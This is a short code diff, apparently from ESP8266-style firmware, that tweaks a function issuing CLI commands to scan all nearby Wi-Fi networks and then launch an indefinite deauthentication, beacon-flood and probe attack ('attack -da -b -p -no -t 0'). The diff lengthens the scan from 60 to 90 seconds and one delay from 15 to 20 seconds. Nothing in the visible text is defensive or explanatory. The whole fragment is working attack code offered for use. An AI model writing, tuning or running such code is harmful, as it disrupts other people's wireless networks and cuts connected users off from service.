@@ -97,10 +97,10 @@ void SaklarON() {
       //      cli.runCommand("attack deauthall"); // start deauth all and beacon attack
       cli.runCommand("set beaconinterval true");
       cli.runCommand("set attacktimeout 0");
-      cli.runCommand("scan all -c 60s");
+      cli.runCommand("scan all -c 90s");
       cli.runCommand("DELAY 5s");
       cli.runCommand("stopap");
-      cli.runCommand("DELAY 15s");
+      cli.runCommand("DELAY 20s");
       cli.runCommand("attack -da -b -p -no -t 0");
       digitalWrite(D4, LOW); // turn LED on
     } else {
